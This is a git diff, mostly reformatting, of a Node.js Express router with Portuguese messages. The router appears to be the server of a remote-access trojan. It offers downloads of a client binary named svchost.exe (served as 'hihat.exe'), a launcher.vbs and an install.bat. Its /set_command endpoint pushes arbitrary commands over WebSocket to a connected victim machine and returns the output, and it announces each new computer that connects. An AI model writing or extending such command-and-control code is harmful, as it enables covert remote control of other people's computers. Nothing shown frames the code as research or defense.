@@ -1,6 +1,7 @@
 const express = require("express");
 const path = require("path");
 const router = express.Router();
+const WebSocket = require("ws"); // Importante para verificação OPEN
 
 let waitingResolvers = [];
 let currentCommand = "";
@@ -20,83 +21,78 @@ function notifyNewComputer(wsss, computerInfo) {
   });
 }
 
-
 function setLastClient(client) {
-    lastClient = client;
+  lastClient = client;
 }
 
 function handleResult(result) {
-    while (waitingResolvers.length > 0) {
-        const resolve = waitingResolvers.shift();
-        resolve(result);
-    }
-    currentCommand = "";
-    commandId = "";
+  while (waitingResolvers.length > 0) {
+    const resolve = waitingResolvers.shift();
+    resolve(result);
+  }
+  currentCommand = "";
+  commandId = "";
 }
 
-
 router.get("/dist/:arquivo", (req, res) => {
-    let filePath;
+  let filePath;
 
-    switch (req.params.arquivo) {
-        case "hihat":
-            filePath = path.resolve(__dirname, "../client/svchost.exe");
-            res.download(filePath, "hihat.exe"); 
-            return;
+  switch (req.params.arquivo) {
+    case "hihat":
+      filePath = path.resolve(__dirname, "../client/svchost.exe");
+      return res.download(filePath, "hihat.exe");
 
-        case "launcher":
-            filePath = path.resolve(__dirname, "../client/launcher.vbs");
-            res.download(filePath, "launcher.vbs");
-            return;
+    case "launcher":
+      filePath = path.resolve(__dirname, "../client/launcher.vbs");
+      return res.download(filePath, "launcher.vbs");
 
-        case "install":
-            filePath = path.resolve(__dirname, "../client/install.bat");
-            res.download(filePath, "install.bat");
-            return;
+    case "install":
+      filePath = path.resolve(__dirname, "../client/install.bat");
+      return res.download(filePath, "install.bat");
 
-        default:
-            return res.status(404).send("Arquivo não encontrado");
-    }
+    default:
+      return res.status(404).send("Arquivo não encontrado");
+  }
 });
 
 router.post("/set_command", async (req, res) => {
-    const { command } = req.body;
-    console.log("[set_command] Recebido:", command);
+  const { command } = req.body;
+  console.log("[set_command] Recebido:", command);
 
-    if (!command) {
-        return res.status(400).json({ error: "Comando não fornecido" });
-    }
+  if (!command) {
+    return res.status(400).json({ error: "Comando não fornecido" });
+  }
 
-    if (!lastClient || lastClient.readyState !== 1) {
-        return res.status(400).json({ error: "Nenhum cliente conectado" });
-    }
+  if (!lastClient || lastClient.readyState !== 1) {
+    return res.status(400).json({ error: "Nenhum cliente conectado" });
+  }
 
-    commandId = Date.now().toString();
-    currentCommand = command;
+  commandId = Date.now().toString();
+  currentCommand = command;
 
-    lastClient.send(JSON.stringify({ id: commandId, command }));
+  lastClient.send(JSON.stringify({ id: commandId, command }));
 
-    try {
-        const result = await new Promise((resolve, reject) => {
-            const timeout = setTimeout(() => {
-                reject("timeout");
-            }, 30000);
-            waitingResolvers.push((output) => {
-                clearTimeout(timeout);
-                resolve(output);
-            });
-        });
+  try {
+    const result = await new Promise((resolve, reject) => {
+      const timeout = setTimeout(() => {
+        reject("timeout");
+      }, 30000);
 
-        res.json({ id: commandId, result });
-    } catch (err) {
-        res.status(504).json({ error: "Tempo esgotado aguardando resultado" });
-    }
+      waitingResolvers.push((output) => {
+        clearTimeout(timeout);
+        resolve(output);
+      });
+    });
+
+    res.json({ id: commandId, result });
+  } catch (err) {
+    res.status(504).json({ error: "Tempo esgotado aguardando resultado" });
+  }
 });
 
 module.exports = {
-    router,
-    setLastClient,
-    handleResult,
-    notifyNewComputer
+  router,
+  setLastClient,
+  handleResult,
+  notifyNewComputer
 };
-
